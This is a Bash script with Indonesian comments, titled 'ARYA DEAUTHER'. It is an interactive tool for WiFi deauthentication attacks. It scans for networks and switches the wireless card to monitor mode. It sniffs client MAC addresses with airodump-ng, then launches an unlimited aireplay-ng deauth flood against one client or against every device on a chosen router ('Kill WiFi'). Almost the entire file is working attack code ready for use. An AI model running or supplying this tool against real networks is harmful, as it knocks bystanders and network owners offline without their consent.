#!/bin/bash

# =================================================================
# Skrip ARYA DEAUTHER
# Update: Tilix & Sniffer Auto-Close setelah Input
# =================================================================

CYAN='\033[96m'
GREEN='\033[92m'
YELLOW='\033[93m'
RED='\033[91m'
NC='\033[0m'
BOLD='\033[1m'

WIFI_INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"

function check_prereqs() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!] Error: Jalankan dengan sudo!${NC}" 
        exit 1
    fi
}

function cleanup() {
    echo -e "\n${YELLOW}[*] Menghentikan semua proses deauth/sniffer...${NC}"
    sudo killall aireplay-ng 2> /dev/null
    sudo killall airodump-ng 2> /dev/null
    sudo killall tilix 2> /dev/null
    sudo killall terminator 2> /dev/null
    
    echo -e "${YELLOW}[*] Mereset interface ke mode managed...${NC}"
    if [ -n "$MON_INTERFACE" ] && ip link show "$MON_INTERFACE" &> /dev/null; then
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
    fi

    sudo ip link set "$WIFI_INTERFACE" down > /dev/null 2>&1
    sudo iwconfig "$WIFI_INTERFACE" mode managed > /dev/null 2>&1
    sudo ip link set "$WIFI_INTERFACE" up > /dev/null 2>&1
    
    echo -e "${YELLOW}[*] Merestart NetworkManager...${NC}"
    sudo systemctl restart NetworkManager > /dev/null 2>&1
    
    echo -e "${GREEN}[+] Interface $WIFI_INTERFACE sudah kembali normal.${NC}"
}

function start_deauth() {
    echo -e "\n${CYAN}=== STEP 1: TARGET INFO ===${NC}"
    nohup tilix -t "SCAN WIFI" -e "nmcli device wifi list" &> /dev/null &
    
    read -p "Masukkan BSSID Router: " BSSID_TARGET
    read -p "Masukkan Channel: " TARGET_CH
    
    # Close Tilix setelah input AP selesai
    sudo killall tilix 2> /dev/null
    
    if [ -z "$BSSID_TARGET" ] || [ -z "$TARGET_CH" ]; then return; fi

    echo -e "\n${CYAN}==========================================${NC}"
    echo -e "${YELLOW}      PILIH MODE SERANGAN DEAUTH          ${NC}"
    echo -e "${CYAN}==========================================${NC}"
    echo -e "1 Personal Target"
    echo -e "2 Kill WiFi"
    echo -e "${CYAN}==========================================${NC}"
    read -p "Pilih [1-2]: " SUBMENU

    airmon-ng check kill > /dev/null 2>&1
    airmon-ng start "$WIFI_INTERFACE" > /dev/null 2>&1
    MON_INTERFACE="${WIFI_INTERFACE}mon"
    iwconfig "$MON_INTERFACE" channel "$TARGET_CH" > /dev/null 2>&1

    case $SUBMENU in
        1)
            echo -e "\n${CYAN}[*] Menjalankan sniffer 10 detik...${NC}"
            # Membuka sniffer di jendela Terminator
            nohup terminator --title="TANGKAP MAC CLIENT" -e "sudo timeout 10s airodump-ng --bssid $BSSID_TARGET --channel $TARGET_CH $MON_INTERFACE; echo -e '\n${RED}[!] SCAN SELESAI.${NC} Masukkan MAC di terminal utama.'; bash" &> /dev/null &
            
            echo -e "${YELLOW}[*] Lihat daftar MAC di baris station...${NC}"
            read -p "Masukkan MAC Address Client: " MAC_CLIENT
            
            # --- PERBAIKAN: Close jendela sniffer setelah Enter MAC ---
            sudo killall airodump-ng 2> /dev/null
            # Kita gunakan pkill dengan title agar tidak mematikan jendela deauth yang nanti dibuka
            pkill -f "TANGKAP MAC CLIENT" 2> /dev/null

            echo -e "${RED}${BOLD}[!] Menyerang Personal: $MAC_CLIENT${NC}"
            nohup terminator --title="ARYA DEAUTHER - ATTACK" -e "sudo aireplay-ng -0 0 -a $BSSID_TARGET -c $MAC_CLIENT $MON_INTERFACE" &> /dev/null &
            ;;
        2)
            echo -e "${RED}${BOLD}[!] Menyerang Kill WiFi: $BSSID_TARGET${NC}"
            nohup terminator --title="ARYA DEAUTHER - ATTACK" -e "sudo aireplay-ng -0 0 -a $BSSID_TARGET $MON_INTERFACE" &> /dev/null &
            ;;
        *)
            cleanup
            return
            ;;
    esac
    
    echo -e "\n${GREEN}[+] Serangan Aktif!${NC}"
    read -p "Tekan ENTER untuk berhenti dan reset WiFi..."
    cleanup
}

# --- MENU UTAMA ---
check_prereqs
trap "cleanup; exit" SIGINT SIGTERM

while true; do
    clear
    echo -e "${CYAN}==========================================${NC}"
    echo -e "${RED}${BOLD}             ARYA DEAUTHER                ${NC}"
    echo -e "${CYAN}==========================================${NC}"
    echo -e "${YELLOW}1${NC} Mulai Serangan WiFi"
    echo -e "${YELLOW}2${NC} Reset WiFi ke Normal"
    echo -e "${YELLOW}3${NC} Keluar"
    echo -e "${CYAN}==========================================${NC}"
    read -p "Pilih [1-3]: " MENU
    
    case $MENU in
        1) start_deauth ;;
        2) 
            cleanup
            echo -e "${GREEN}WiFi sudah di-reset. Tekan ENTER untuk kembali ke menu...${NC}"
            read 
            ;;
        3) 
            cleanup
            exit 0 
            ;;
        *) sleep 1 ;;
    esac
done
